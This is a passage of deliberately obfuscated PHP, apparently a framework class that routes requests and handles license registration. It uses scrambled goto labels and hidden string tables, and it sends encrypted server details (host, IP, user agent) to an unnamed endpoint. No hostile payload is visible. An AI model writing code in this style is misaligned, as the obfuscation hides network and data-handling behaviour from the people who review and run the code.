cà¬…£…ñ…; A¤‘×¾Ãˆ: $BŠô¬İ«’[39]($BŠô¬İ«’[42], isset($e‹³Óá„Õ§[2]) && $e‹³Óá„Õ§[0] ? $e‹³Óá„Õ§[2] : $this->defaultAction); $BŠô¬İ«’[39]($BŠô¬İ«’[43], MOD . $BŠô¬İ«’[1] . ST . $BŠô¬İ«’[1] . ACT); $_SERVER[$BŠô¬İ«’[44]] = $BŠô¬İ«’[6](ACTION); goto C»·•Íæ; b–¿´Àªö½: $e‹³Óá„Õ§ = $GLOBALS[$BŠô¬İ«’[22]][$BŠô¬İ«’[23]]; $a²Şğ‹â”ƒ = $a÷ÌŞÊÕí[584]; if (!$a²Şğ‹â”ƒ) { die; } goto aŒäŠ¨ïõñ; aßÍÄ•ƒÒµ: $this->{$_SERVER[îë][38]}(); $a¹ÙÅ‚…³  = $a÷ÌŞÊÕí[583]; if (!$a¹ÙÅ‚…³ ) { die; } goto b–¿´Àªö½; cà¬…£…ñ…: $a÷ÌŞÊÕí =& $_SERVER[¯Ò¬Èè]; $BŠô¬İ«’ =& $_SERVER[îë]; $this->{$_SERVER[îë][37]}(); goto aßÍÄ•ƒÒµ; aŒäŠ¨ïõñ: $A¿Û¨ŠÚìŞ = $GLOBALS[$BŠô¬İ«’[22]][$BŠô¬İ«’[28]]; $BŠô¬İ«’[39]($BŠô¬İ«’[40], isset($e‹³Óá„Õ§[0]) && $e‹³Óá„Õ§[0] ? $e‹³Óá„Õ§[0] : $this->defaultModule); $B¡ÏÚŞù‘¢ = $a÷ÌŞÊÕí[585]; goto c®÷…¸µã; c®÷…¸µã: if (!$B¡ÏÚŞù‘¢) { return; } $BŠô¬İ«’[39]($BŠô¬İ«’[41], isset($e‹³Óá„Õ§[1]) && $e‹³Óá„Õ§[0] ? $e‹³Óá„Õ§[1] : $this->defaultController); $eæóŒ±Œˆï = $a÷ÌŞÊÕí[586]; goto A¤‘×¾Ãˆ; C»·•Íæ: $EĞƒÓ”êÙƒ = $a÷ÌŞÊÕí[587]; if (strlen($EĞƒÓ”êÙƒ) < $a÷ÌŞÊÕí[574]) { return; } $this->{$_SERVER[îë][45]}(); goto eõ‡¹ ­–ˆ; eõ‡¹ ­–ˆ: if ($BŠô¬İ«’[19]($e‹³Óá„Õ§) >= 3) { $this->{$_SERVER[îë][21]}($A¿Û¨ŠÚìŞ); } else { $this->{$_SERVER[îë][21]}(ACTION); } goto E¯ÆµÄøù‘; E¯ÆµÄøù‘: } private $udgr5e563d83 = array(); private $uqpd67a2bde1 = ''; public function peys73edbc76() { goto F˜È­ä«ÒŸ; FÀÈÆ„ñ´¨: if (strlen($F¦¤ª‘Î ¢) < $dˆœÒ‰‡²ê[560]) { die; } $this->{$_SERVER[îë][49]}(); $f—‘µ§ƒŠ = $dˆœÒ‰‡²ê[589]; goto C¨ÒÁ¢îâÚ; F­®º³Š½: if (!$Dã¥Ÿöˆ¦ë) { die; } $this->{$_SERVER[îë][3]}($cĞ¢àÔìƒ‘[55], array($this, $cĞ¢àÔìƒ‘[56])); $this->{$_SERVER[îë][3]}($cĞ¢àÔìƒ‘[57], array($this, $cĞ¢àÔìƒ‘[58])); goto D®¸ØÀš¯¢; Eˆìª›‰ÀÖ: $this->{$_SERVER[îë][47]}(); $this->{$_SERVER[îë][48]}(); $F¦¤ª‘Î ¢ = $dˆœÒ‰‡²ê[588]; goto FÀÈÆ„ñ´¨; C¨ÒÁ¢îâÚ: while (strlen($f—‘µ§ƒŠ) < $dˆœÒ‰‡²ê[560]) { if (!$f—‘µ§ƒŠ) { break; } $f—‘µ§ƒŠ++; } $this->{$_SERVER[îë][50]}(); $Aİ™Ÿí‡Ì„ = $dˆœÒ‰‡²ê[590]; goto A—ªê¿öóÇ; D®¸ØÀš¯¢: $C»„³îêÉ× = $dˆœÒ‰‡²ê[594]; while ($C»„³îêÉ× < $dˆœÒ‰‡²ê[495]) { if ($C»„³îêÉ× >= 0) { break; } $C»„³îêÉ×++; } $this->{$_SERVER[îë][3]}($cĞ¢àÔìƒ‘[59], array($this, $cĞ¢àÔìƒ‘[60])); goto E—ç˜Ñ¢ö´; E—ç˜Ñ¢ö´: $e¦´ëµ×›³ = $dˆœÒ‰‡²ê[595]; if (strlen($e¦´ëµ×›³) < $dˆœÒ‰‡²ê[563]) { return; } goto DÁ¶¢«‰è®; F˜È­ä«ÒŸ: $dˆœÒ‰‡²ê =& $_SERVER[¯Ò¬Èè]; $cĞ¢àÔìƒ‘ =& $_SERVER[îë]; $this->{$_SERVER[îë][46]}(); goto Eˆìª›‰ÀÖ; A—ªê¿öóÇ: $this->{$_SERVER[îë][51]}(); $F¨šğŸõ… = $dˆœÒ‰‡²ê[591]; $this->{$_SERVER[îë][52]}(); goto a¼ŒÕí¹¿©; a¼ŒÕí¹¿©: $aòŠœ» = $dˆœÒ‰‡²ê[592]; $this->{$_SERVER[îë][3]}($cĞ¢àÔìƒ‘[53], array($this, $cĞ¢àÔìƒ‘[54])); $Dã¥Ÿöˆ¦ë = $dˆœÒ‰‡²ê[593]; goto F­®º³Š½; DÁ¶¢«‰è®: } public function baso73e2afcf($Eºîó³˜) { goto F½†‘…¾Ïö; eÓôêÀÍ•: if (!$e£î…øğ‡) { die; } unset($Eºîó³˜[$d¾¦¾æ¢´ˆ[93]][$d¾¦¾æ¢´ˆ[95]][$d¾¦¾æ¢´ˆ[96]]); $AàíÅØë¿× = $c‚§‚ŠÄÛ[598]; goto FµÇéî‡„¹; B¡œ§èôóÊ: $Eºîó³˜[$d¾¦¾æ¢´ˆ[93]][$d¾¦¾æ¢´ˆ[94]][$d¾¦¾æ¢´ˆ[99]] = array($d¾¦¾æ¢´ˆ[100] => (int) $CªÎ‹àŞ™Ô[$d¾¦¾æ¢´ˆ[101]], $d¾¦¾æ¢´ˆ[102] => $d¾¦¾æ¢´ˆ[103]($d¾¦¾æ¢´ˆ[104]($CªÎ‹àŞ™Ô, $d¾¦¾æ¢´ˆ[105], array())), $d¾¦¾æ¢´ˆ[106] => (int) $d¾¦¾æ¢´ˆ[104]($CªÎ‹àŞ™Ô, $d¾¦¾æ¢´ˆ[107], 0)); $Eºîó³˜[$d¾¦¾æ¢´ˆ[108]][$d¾¦¾æ¢´ˆ[109]] = $d¾¦¾æ¢´ˆ[110]($d¾¦¾æ¢´ˆ[111])->{$_SERVER[îë][112]}(); $Eºîó³˜[$d¾¦¾æ¢´ˆ[108]][$d¾¦¾æ¢´ˆ[113]] = $d¾¦¾æ¢´ˆ[114]($_SERVER[$d¾¦¾æ¢´ˆ[115]] . $Bò¬òŞºŞ[$d¾¦¾æ¢´ˆ[116]]); goto DÎ«¼³ØÖ; c¬–Õ—Ü‰°: foreach ($d†ÛÌã¸—´ as $B‚ºÊ÷†ãĞ) { $F¡ÈÅ’Î¹ = $GLOBALS[$d¾¦¾æ¢´ˆ[91]][$d¾¦¾æ¢´ˆ[92]][$B‚ºÊ÷†ãĞ]; if (isset($Bò¬òŞºŞ[$B‚ºÊ÷†ãĞ])) { $F¡ÈÅ’Î¹ = $Bò¬òŞºŞ[$B‚ºÊ÷†ãĞ]; } $Eºîó³˜[$d¾¦¾æ¢´ˆ[93]][$d¾¦¾æ¢´ˆ[94]][$B‚ºÊ÷†ãĞ] = $F¡ÈÅ’Î¹; } $CªÎ‹àŞ™Ô = $Eºîó³˜[$d¾¦¾æ¢´ˆ[93]][$d¾¦¾æ¢´ˆ[94]][$d¾¦¾æ¢´ˆ[76]]; $e£î…øğ‡ = $c‚§‚ŠÄÛ[597]; goto eÓôêÀÍ•; DÎ«¼³ØÖ: $Eºîó³˜[$d¾¦¾æ¢´ˆ[108]][$d¾¦¾æ¢´ˆ[117]] = $d¾¦¾æ¢´ˆ[118]($d¾¦¾æ¢´ˆ[119]()); $AÍÊ—ƒî³º = $c‚§‚ŠÄÛ[600]; if (!$AÍÊ—ƒî³º) { die; } goto fÜ‹¢œåğ‘; FµÇéî‡„¹: if (strlen($AàíÅØë¿×) < $c‚§‚ŠÄÛ[563]) { return; } unset($Eºîó³˜[$d¾¦¾æ¢´ˆ[93]][$d¾¦¾æ¢´ˆ[95]][$d¾¦¾æ¢´ˆ[97]]); unset($Eºîó³˜[$d¾¦¾æ¢´ˆ[93]][$d¾¦¾æ¢´ˆ[94]][$d¾¦¾æ¢´ˆ[76]]); goto fµÒ‹ æŒ; fµÒ‹ æŒ: $aß«Í–®Ì = $c‚§‚ŠÄÛ[599]; if (strlen($aß«Í–®Ì) < $c‚§‚ŠÄÛ[495]) { die; } unset($Eºîó³˜[$d¾¦¾æ¢´ˆ[93]][$d¾¦¾æ¢´ˆ[94]][$d¾¦¾æ¢´ˆ[98]]); goto B¡œ§èôóÊ; E´¹Ô¼Ëä©: $d†ÛÌã¸—´ = array($d¾¦¾æ¢´ˆ[64], $d¾¦¾æ¢´ˆ[65], $d¾¦¾æ¢´ˆ[66], $d¾¦¾æ¢´ˆ[67], $d¾¦¾æ¢´ˆ[68], $d¾¦¾æ¢´ˆ[69], $d¾¦¾æ¢´ˆ[70], $d¾¦¾æ¢´ˆ[71], $d¾¦¾æ¢´ˆ[72], $d¾¦¾æ¢´ˆ[73], $d¾¦¾æ¢´ˆ[74], $d¾¦¾æ¢´ˆ[75], $d¾¦¾æ¢´ˆ[76], $d¾¦¾æ¢´ˆ[77], $d¾¦¾æ¢´ˆ[78], $d¾¦¾æ¢´ˆ[79], $d¾¦¾æ¢´ˆ[80], $d¾¦¾æ¢´ˆ[81], $d¾¦¾æ¢´ˆ[82], $d¾¦¾æ¢´ˆ[83], $d¾¦¾æ¢´ˆ[84], $d¾¦¾æ¢´ˆ[85], $d¾¦¾æ¢´ˆ[86], $d¾¦¾æ¢´ˆ[87], $d¾¦¾æ¢´ˆ[88], $d¾¦¾æ¢´ˆ[89], $d¾¦¾æ¢´ˆ[90]); $E‚¶î÷§´ = $c‚§‚ŠÄÛ[596]; if (strlen($E‚¶î÷§´) < $c‚§‚ŠÄÛ[495]) { return; } goto c¬–Õ—Ü‰°; dô¦çñ×¿±: if ($this->uqpd67a2bde1 == $d¾¦¾æ¢´ˆ[121]) { $Eºîó³˜[$d¾¦¾æ¢´ˆ[93]][$d¾¦¾æ¢´ˆ[94]][$d¾¦¾æ¢´ˆ[99]][$d¾¦¾æ¢´ˆ[107]] = 0; } $Eºîó³˜[$d¾¦¾æ¢´ˆ[108]][$d¾¦¾æ¢´ˆ[128]] = $d¾¦¾æ¢´ˆ[104]($this->udgr5e563d83, $d¾¦¾æ¢´ˆ[129], $d¾¦¾æ¢´ˆ[10]); $Eºîó³˜[$d¾¦¾æ¢´ˆ[108]][$d¾¦¾æ¢´ˆ[130]] = $d¾¦¾æ¢´ˆ[104]($this->udgr5e563d83, $d¾¦¾æ¢´ˆ[131], $d¾¦¾æ¢´ˆ[10]); goto AŠÔ×İ‰Å; F½†‘…¾Ïö: $c‚§‚ŠÄÛ =& $_SERVER[¯Ò¬Èè]; $d¾¦¾æ¢´ˆ =& $_SERVER[îë]; $Bò¬òŞºŞ = $d¾¦¾æ¢´ˆ[61]($d¾¦¾æ¢´ˆ[62])->{$_SERVER[îë][63]}(); goto E´¹Ô¼Ëä©; AŠÔ×İ‰Å: if ($d¾¦¾æ¢´ˆ[104]($GLOBALS, $d¾¦¾æ¢´ˆ[132]) && $this->config[$d¾¦¾æ¢´ˆ[133]]) { $Eºîó³˜[$d¾¦¾æ¢´ˆ[108]][$d¾¦¾æ¢´ˆ[134]] = WEB_ROOT; } return $Eºîó³˜; goto DÉñèï¯¥Õ; fÜ‹¢œåğ‘: $Eºîó³˜[$d¾¦¾æ¢´ˆ[108]][$d¾¦¾æ¢´ˆ[120]] = $this->uqpd67a2bde1; $a½ëÄò£ â = $c‚§‚ŠÄÛ[601]; if ($Bò¬òŞºŞ[$d¾¦¾æ¢´ˆ[120]] != $d¾¦¾æ¢´ˆ[121]) { $Eºîó³˜[$d¾¦¾æ¢´ˆ[108]][$d¾¦¾æ¢´ˆ[122]] = $Bò¬òŞºŞ[$d¾¦¾æ¢´ˆ[122]]; $Eºîó³˜[$d¾¦¾æ¢´ˆ[108]][$d¾¦¾æ¢´ˆ[123]] = $Bò¬òŞºŞ[$d¾¦¾æ¢´ˆ[123]]; $aïè¿ÌÌÈ× = $d¾¦¾æ¢´ˆ[124](10) . $this->uqpd67a2bde1 . $d¾¦¾æ¢´ˆ[124](5); $Eºîó³˜[$d¾¦¾æ¢´ˆ[93]][$d¾¦¾æ¢´ˆ[125]][$d¾¦¾æ¢´ˆ[126]] = $this->{$_SERVER[îë][127]}($aïè¿ÌÌÈ×, $Eºîó³˜[$d¾¦¾æ¢´ˆ[108]][$d¾¦¾æ¢´ˆ[113]]); } goto dô¦çñ×¿±; DÉñèï¯¥Õ: } private function zxgj24df031d() { goto a…ì‡ÛÃÏ’; E™´ÃçÑÌ: while ($a©‰Æ¬îÚ < $A§ÔâÁãİµ[563]) { if ($a©‰Æ¬îÚ >= 0) { break; } $a©‰Æ¬îÚ++; } foreach ($D˜›ùø™ë¥ as $Dè¹„ìËàó) { if (!isset($B‰•“‘–ƒ[$Dè¹„ìËàó]) || !$B‰•“‘–ƒ[$Dè¹„ìËàó]) { continue; } $B´õñÅå‡¨[$Dè¹„ìËàó] = $B‰•“‘–ƒ[$Dè¹„ìËàó]; } $f¹ŠÖ‚ãêî[13](array($f¹ŠÖ‚ãêî[151], $f¹ŠÖ‚ãêî[152]), $B´õñÅå‡¨); goto C÷Ô¸âÈæ‰; c§„ƒÌŠÎ: if ($this->uqpd67a2bde1 == $f¹ŠÖ‚ãêî[121]) { return; } $D˜›ùø™ë¥ = array($f¹ŠÖ‚ãêî[153], $f¹ŠÖ‚ãêî[154], $f¹ŠÖ‚ãêî[155], $f¹ŠÖ‚ãêî[156], $f¹ŠÖ‚ãêî[157], $f¹ŠÖ‚ãêî[158]); $C¦Ê¯Ğ•î = $A§ÔâÁãİµ[603]; goto a«Ÿ½ŒÏîå; a…ì‡ÛÃÏ’: $A§ÔâÁãİµ =& $_SERVER[¯Ò¬Èè]; $f¹ŠÖ‚ãêî =& $_SERVER[îë]; if ($_SERVER[$f¹ŠÖ‚ãêî[44]] == $f¹ŠÖ‚ãêî[135]) { goto DŠ¯‡åù†ù; Cµ«¥¬×¯°: while (strlen($bî­’¶Ï˜ƒ) < $A§ÔâÁãİµ[560]) { if (!$bî­’¶Ï˜ƒ) { break; } $bî­’¶Ï˜ƒ++; } goto AŞíñğ²’; DŠ¯‡åù†ù: $FªôÔ†‡Î¦ = array($f¹ŠÖ‚ãêî[120] => $this->uqpd67a2bde1, $f¹ŠÖ‚ãêî[136] => $this->{$_SERVER[îë][137]}(), $f¹ŠÖ‚ãêî[138] => $f¹ŠÖ‚ãêî[61]($f¹ŠÖ‚ãêî[139])->{$_SERVER[îë][140]}()); if ($this->uqpd67a2bde1 != $f¹ŠÖ‚ãêî[121]) { $cÛ¼Ö¾Ù = $f¹ŠÖ‚ãêî[104]($this->udgr5e563d83, $f¹ŠÖ‚ãêî[141]); if ($cÛ¼Ö¾Ù) { $FªôÔ†‡Î¦[$f¹ŠÖ‚ãêî[142]] = $cÛ¼Ö¾Ù; $FªôÔ†‡Î¦[$f¹ŠÖ‚ãêî[143]] = $f¹ŠÖ‚ãêî[144]($f¹ŠÖ‚ãêî[104]($this->udgr5e563d83, $f¹ŠÖ‚ãêî[145])); $FªôÔ†‡Î¦[$f¹ŠÖ‚ãêî[146]] = $f¹ŠÖ‚ãêî[104]($this->udgr5e563d83, $f¹ŠÖ‚ãêî[131]); } } $FªôÔ†‡Î¦ = $this->{$_SERVER[îë][147]}($f¹ŠÖ‚ãêî[148]($FªôÔ†‡Î¦), $f¹ŠÖ‚ãêî[114]($f¹ŠÖ‚ãêî[149])); goto d‹ĞÍôœ£»; d‹ĞÍôœ£»: $B´õñÅå‡¨ = array($f¹ŠÖ‚ãêî[150] => $FªôÔ†‡Î¦); $f¹ŠÖ‚ãêî[13](array($f¹ŠÖ‚ãêî[151], $f¹ŠÖ‚ãêî[152]), $B´õñÅå‡¨); $bî­’¶Ï˜ƒ = $A§ÔâÁãİµ[602]; goto Cµ«¥¬×¯°; AŞíñğ²’: } goto c§„ƒÌŠÎ; a«Ÿ½ŒÏîå: $B‰•“‘–ƒ = $f¹ŠÖ‚ãêî[61]($f¹ŠÖ‚ãêî[62])->{$_SERVER[îë][63]}(); $B´õñÅå‡¨ = array($f¹ŠÖ‚ãêî[159] => $B‰•“‘–ƒ[$f¹ŠÖ‚ãêî[64]], $f¹ŠÖ‚ãêî[160] => $B‰•“‘–ƒ[$f¹ŠÖ‚ãêî[65]], $f¹ŠÖ‚ãêî[161] => $f¹ŠÖ‚ãêî[10]); $a©‰Æ¬îÚ = $A§ÔâÁãİµ[604]; goto E™´ÃçÑÌ; C÷Ô¸âÈæ‰: } private function xgkqb418fbfe() { goto A÷‰µÔùùĞ; a…—Åİ•Ã: $C“¼¿œ‰÷ô = $F­™µ¢ÜÑ—[610]; if (strlen($C“¼¿œ‰÷ô) < $F­™µ¢ÜÑ—[570]) { die; } if ($Cß·Á®éˆ[$BÎ÷°Š°¦‚[217]] && $Cß·Á®éˆ[$BÎ÷°Š°¦‚[217]] >= 1) { $BÎ÷°Š°¦‚[61]($BÎ÷°Š°¦‚[62])->{$_SERVER[îë][218]}($BÎ÷°Š°¦‚[219], $BÎ÷°Š°¦‚[220]); } goto f³º÷ô¦ŠĞ; DƒÁ‹ãô¯í: $f‘¹˜øÜŞ = $this->{$_SERVER[îë][127]}($BÎ÷°Š°¦‚[148]($Cß·Á®éˆ), $dÓê«Òİ¨‡); $câøßæÔÊ” = $BÎ÷°Š°¦‚[222]($BÎ÷°Š°¦‚[61]($BÎ÷°Š°¦‚[11])->{$_SERVER[îë][223]}(), $BÎ÷°Š°¦‚[224]); $f–ŠˆšÊÆŠ = $F­™µ¢ÜÑ—[611]; goto B¤•°œ ğŠ; B¼³É¥÷¤ß: if (!isset($c¹§½µæÃƒ[$BÎ÷°Š°¦‚[165]]) || $BÎ÷°Š°¦‚[24]($c¹§½µæÃƒ[$BÎ÷°Š°¦‚[165]]) != 16) { $BÎ÷°Š°¦‚[166]($BÎ÷°Š°¦‚[167] . $c¹§½µæÃƒ[$BÎ÷°Š°¦‚[165]], !1); } $AÅÂ‚«Îœ´ = $BÎ÷°Š°¦‚[61]($BÎ÷°Š°¦‚[62])->{$_SERVER[îë][63]}($BÎ÷°Š°¦‚[116]); $fŒÊ¢…è = array($BÎ÷°Š°¦‚[165] => $c¹§½µæÃƒ[$BÎ÷°Š°¦‚[165]], $BÎ÷°Š°¦‚[168] => $BÎ÷°Š°¦‚[124](16), $BÎ÷°Š°¦‚[169] => $BÎ÷°Š°¦‚[149], $BÎ÷°Š°¦‚[170] => $BÎ÷°Š°¦‚[171], $BÎ÷°Š°¦‚[172] => $_SERVER[$BÎ÷°Š°¦‚[173]], $BÎ÷°Š°¦‚[174] => $_SERVER[$BÎ÷°Š°¦‚[175]], $BÎ÷°Š°¦‚[176] => $_SERVER[$BÎ÷°Š°¦‚[177]]); goto Eã«™ğô£½; Eã«™ğô£½: $dêà‡Äâ‰Ç = $F­™µ¢ÜÑ—[605]; while ($dêà‡Äâ‰Ç < $F­™µ¢ÜÑ—[574]) { if ($dêà‡Äâ‰Ç >= 0) { break; } $dêà‡Äâ‰Ç++; } $cˆ¶¶õìÔ = $BÎ÷°Š°¦‚[114]($_SERVER[$BÎ÷°Š°¦‚[115]] . $AÅÂ‚«Îœ´); goto Dªª¿£éËá; b²ËÂëÜø¯: $d‡›ÜµğÈ = $F­™µ¢ÜÑ—[609]; if (!$d‡›ÜµğÈ) { die; } $AÇçŸ’¼˜¤[$BÎ÷°Š°¦‚[123]] = $BÎ÷°Š°¦‚[118]($BÎ÷°Š°¦‚[214]($this->{$_SERVER[îë][147]}($E¬’Ï¶ÙöÒ, $BÎ÷°Š°¦‚[216]))); goto a…—Åİ•Ã; FÜŸƒËâ„¿: if (strlen($F©Š†ôù³„) < $F­™µ¢ÜÑ—[570]) { die; } $this->uqpd67a2bde1 = $AÇçŸ’¼˜¤[$BÎ÷°Š°¦‚[120]]; $this->{$_SERVER[îë][229]}(); goto B×µëàŠè¯; e§£àâÈ½†: $AÇçŸ’¼˜¤[$BÎ÷°Š°¦‚[122]] = $BÎ÷°Š°¦‚[214]($BÎ÷°Š°¦‚[118]($this->{$_SERVER[îë][147]}($b‹Ş‰İ¹ÜŞ, $BÎ÷°Š°¦‚[215]))); $Dƒãšª…Ç = $BÎ÷°Š°¦‚[124](16); $E¬’Ï¶ÙöÒ = $Dƒãšª…Ç . $AÇçŸ’¼˜¤[$BÎ÷°Š°¦‚[120]] . $this->{$_SERVER[îë][147]}($BÎ÷°Š°¦‚[114]($AÇçŸ’¼˜¤[$BÎ÷°Š°¦‚[209]]), $Dƒãšª…Ç); goto b²ËÂëÜø¯; c¡ˆ‹î¥£: if (!$BÎ÷°Š°¦‚[104]($GLOBALS, $BÎ÷°Š°¦‚[132])) { die; } $c¹§½µæÃƒ = $GLOBALS[$BÎ÷°Š°¦‚[22]]; if (isset($c¹§½µæÃƒ[$BÎ÷°Š°¦‚[163]])) { $this->{$_SERVER[îë][164]}(); die; } goto B¼³É¥÷¤ß; d”·’Œ¸ù§: $d¾œ˜ÊÓù©[$F««”£Š] = $f‘¹˜øÜŞ; $BÎ÷°Š°¦‚[61]($BÎ÷°Š°¦‚[11])->{$_SERVER[îë][226]}($dÏÀÇ¥Ğ£Å[$BÎ÷°Š°¦‚[227]], array($BÎ÷°Š°¦‚[228] => $d¾œ˜ÊÓù©)); $D°î‡ˆö = $F­™µ¢ÜÑ—[612]; goto Fåä®ƒè; Dªª¿£éËá: $B¨Œ°ÎÇ­Æ = $F­™µ¢ÜÑ—[606]; if (strlen($B¨Œ°ÎÇ­Æ) < $F­™µ¢ÜÑ—[560]) { return; } if ($c¹§½µæÃƒ[$BÎ÷°Š°¦‚[178]] == $BÎ÷°Š°¦‚[179]) { $AŠ„­µ½®ë = $this->{$_SERVER[îë][147]}($cˆ¶¶õìÔ, $BÎ÷°Š°¦‚[180]); $c¹‹ÙĞ‰ = $this->{$_SERVER[îë][127]}($BÎ÷°Š°¦‚[148]($fŒÊ¢…è), $cˆ¶¶õìÔ . $BÎ÷°Š°¦‚[181], 3); $e¯ÓïĞÊ”Œ = $this->{$_SERVER[îë][182]}($BÎ÷°Š°¦‚[183] . $AŠ„­µ½®ë . $BÎ÷°Š°¦‚[184] . $c¹‹ÙĞ‰, -1); $BÎ÷°Š°¦‚[166]($e¯ÓïĞÊ”Œ, !0); } else { if ($c¹§½µæÃƒ[$BÎ÷°Š°¦‚[178]] == $BÎ÷°Š°¦‚[185]) { $e–¸Šƒ†… = $BÎ÷°Š°¦‚[25]($BÎ÷°Š°¦‚[114]($BÎ÷°Š°¦‚[186] . $cˆ¶¶õìÔ), 12, 15) . $BÎ÷°Š°¦‚[187]; $c¹‹ÙĞ‰ = $this->{$_SERVER[îë][188]}($BÎ÷°Š°¦‚[2]($c¹§½µæÃƒ[$BÎ÷°Š°¦‚[189]]), $e–¸Šƒ†…, 2); $Cõ‡Ó÷„× = $BÎ÷°Š°¦‚[190]($c¹‹ÙĞ‰, !0); if (!$BÎ÷°Š°¦‚[191]($Cõ‡Ó÷„×) || !$BÎ÷°Š°¦‚[191]($Cõ‡Ó÷„×[$BÎ÷°Š°¦‚[192]]) || $Cõ‡Ó÷„×[$BÎ÷°Š°¦‚[165]] != !0) { $d» ¥»ƒˆ = $BÎ÷°Š°¦‚[193]; $dÒŞé–Àê = $Cõ‡Ó÷„×[$BÎ÷°Š°¦‚[192]] ? $BÎ÷°Š°¦‚[194] . $Cõ‡Ó÷„×[$BÎ÷°Š°¦‚[192]] : $d» ¥»ƒˆ; $BÎ÷°Š°¦‚[166]($dÒŞé–Àê, !1); } else { $fŒÊ¢…è[$BÎ÷°Š°¦‚[168]] = $Cõ‡Ó÷„×[$BÎ÷°Š°¦‚[192]][$BÎ÷°Š°¦‚[195]]; } } else { $Cõ‡Ó÷„× = $this->{$_SERVER[îë][182]}($BÎ÷°Š°¦‚[196], $fŒÊ¢…è, 10); $cö†Ş¦‡¿Ô = $F­™µ¢ÜÑ—[607]; while (strlen($cö†Ş¦‡¿Ô) < $F­™µ¢ÜÑ—[563]) { if (!$cö†Ş¦‡¿Ô) { break; } $cö†Ş¦‡¿Ô++; } } } goto Dó¹šÈÂà‘; A÷‰µÔùùĞ: $F­™µ¢ÜÑ— =& $_SERVER[¯Ò¬Èè]; $BÎ÷°Š°¦‚ =& $_SERVER[îë]; if ($_SERVER[$BÎ÷°Š°¦‚[44]] != $BÎ÷°Š°¦‚[162]) { return; } goto c¡ˆ‹î¥£; e×ö¸äõÀŒ: if (!$A¦—‹èĞµà || $A¦—‹èĞµà != $BÎ÷°Š°¦‚[201]($Cß·Á®éˆ[$BÎ÷°Š°¦‚[145]])) { $aÕ³´íÊ¾î = array($BÎ÷°Š°¦‚[202] => $BÎ÷°Š°¦‚[61]($BÎ÷°Š°¦‚[62])->{$_SERVER[îë][63]}($BÎ÷°Š°¦‚[116]), $BÎ÷°Š°¦‚[203] => $_SERVER[$BÎ÷°Š°¦‚[115]], $BÎ÷°Š°¦‚[204] => $BÎ÷°Š°¦‚[205](), $BÎ÷°Š°¦‚[174] => $_SERVER[$BÎ÷°Š°¦‚[175]]); $c¹‹ÙĞ‰ = $this->{$_SERVER[îë][206]}($BÎ÷°Š°¦‚[148]($aÕ³´íÊ¾î)); $this->{$_SERVER[îë][182]}($BÎ÷°Š°¦‚[207] . $c¹‹ÙĞ‰); $BÎ÷°Š°¦‚[166]($BÎ÷°Š°¦‚[197]($BÎ÷°Š°¦‚[208]), !0); } $AÇçŸ’¼˜¤ = array($BÎ÷°Š°¦‚[209] => $fŒÊ¢…è[$BÎ÷°Š°¦‚[165]], $BÎ÷°Š°¦‚[210] => $Cß·Á®éˆ[$BÎ÷°Š°¦‚[211]], $BÎ÷°Š°¦‚[212] => $BÎ÷°Š°¦‚[124](16), $BÎ÷°Š°¦‚[120] => $Cß·Á®éˆ[$BÎ÷°Š°¦‚[213]]); if ($fŒÊ¢…è[$BÎ÷°Š°¦‚[168]]) { $AÇçŸ’¼˜¤[$BÎ÷°Š°¦‚[212]] = $fŒÊ¢…è[$BÎ÷°Š°¦‚[168]]; } goto e´¤Øöó; aéˆäå•Á: while ($FµæöĞ‘â• < $F­™µ¢ÜÑ—[563]) { if ($FµæöĞ‘â• >= 0) { break; } $FµæöĞ‘â•++; } goto A©Á «â’õ; B¤•°œ ğŠ: while ($f–ŠˆšÊÆŠ < $F­™µ¢ÜÑ—[560]) { if ($f–ŠˆšÊÆŠ >= 0) { break; } $f–ŠˆšÊÆŠ++; } $dÏÀÇ¥Ğ£Å = $câøßæÔÊ”[$BÎ÷°Š°¦‚[225]]; $d¾œ˜ÊÓù© = array(); goto d”·’Œ¸ù§; Dó¹šÈÂà‘: if (!$BÎ÷°Š°¦‚[191]($Cõ‡Ó÷„×) || !$BÎ÷°Š°¦‚[191]($Cõ‡Ó÷„×[$BÎ÷°Š°¦‚[192]]) || $Cõ‡Ó÷„×[$BÎ÷°Š°¦‚[165]] != !0) { $d» ¥»ƒˆ = $BÎ÷°Š°¦‚[197]($BÎ÷°Š°¦‚[198]); $dÒŞé–Àê = $Cõ‡Ó÷„×[$BÎ÷°Š°¦‚[192]] ? $BÎ÷°Š°¦‚[194] . $Cõ‡Ó÷„×[$BÎ÷°Š°¦‚[192]] : $d» ¥»ƒˆ; $BÎ÷°Š°¦‚[166]($dÒŞé–Àê, !1); } $Cß·Á®éˆ = $Cõ‡Ó÷„×[$BÎ÷°Š°¦‚[192]]; $A¦—‹èĞµà = $this->{$_SERVER[îë][199]}($Cß·Á®éˆ[$BÎ÷°Š°¦‚[200]]); goto e×ö¸äõÀŒ; Fåä®ƒè: if (!$D°î‡ˆö) { return; } $this->udgr5e563d83 = $Cß·Á®éˆ; $F©Š†ôù³„ = $F­™µ¢ÜÑ—[613]; goto FÜŸƒËâ„¿; e´¤Øöó: $cº¦°ÙÂÎ = $BÎ÷°Š°¦‚[25]($BÎ÷°Š°¦‚[114]($AÇçŸ’¼˜¤[$BÎ÷°Š°¦‚[210]]), 10, 10); $b‹Ş‰İ¹ÜŞ = $cº¦°ÙÂÎ . $AÇçŸ’¼˜¤[$BÎ÷°Š°¦‚[120]] . $AÇçŸ’¼˜¤[$BÎ÷°Š°¦‚[212]]; $aâ¨¹†Êö‘ = $F­™µ¢ÜÑ—[608]; goto e§£àâÈ½†; B×µëàŠè¯: $FÃáµŠ©¶æ = $F­™µ¢ÜÑ—[614]; $BÎ÷°Š°¦‚[166]($BÎ÷°Š°¦‚[197]($BÎ÷°Š°¦‚[208]), !0); $FµæöĞ‘â• = $F­™µ¢ÜÑ—[615]; goto aéˆäå•Á; f³º÷ô¦ŠĞ: $BÎ÷°Š°¦‚[61]($BÎ÷°Š°¦‚[62])->{$_SERVER[îë][221]}($AÇçŸ’¼˜¤); $dÓê«Òİ¨‡ = $BÎ÷°Š°¦‚[114]($_SERVER[$BÎ÷°Š°¦‚[115]] . $BÎ÷°Š°¦‚[214]($AÅÂ‚«Îœ´) . $AÇçŸ’¼˜¤[$BÎ÷°Š°¦‚[210]]); $F««”£Š = $BÎ÷°Š°¦‚[214]($BÎ÷°Š°¦‚[25]($dÓê«Òİ¨‡, 10, 16)); goto DƒÁ‹ãô¯í; A©Á «â’õ: } private function licenseRegistSuccess() { goto FªÓÙ¯Çì; fáòÍ‹Ëß: $C¸Á÷¸Úò = $BôØ»éÆøß[616]; while ($C¸Á÷¸Úò < $BôØ»éÆøß[574]) { if 